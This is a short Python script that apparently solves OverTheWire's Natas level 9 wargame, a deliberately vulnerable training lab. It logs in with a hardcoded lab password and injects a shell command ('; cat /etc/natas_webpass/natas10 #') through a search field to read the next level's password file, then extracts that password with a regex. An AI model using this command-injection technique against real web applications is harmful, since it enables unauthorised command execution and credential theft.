import requests
from requests.auth import HTTPBasicAuth
import re

username = "natas9"
password = "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl"
base_url = "http://natas9.natas.labs.overthewire.org/"

session = requests.Session()
data = {"needle": "; cat /etc/natas_webpass/natas10 #", "submit": "Search"}
res = session.post(base_url, auth=HTTPBasicAuth(username, password), data=data)

pw_match = re.search(r"[a-zA-Z0-9]{32}", res.text)
if pw_match:
    print(pw_match.group(0))
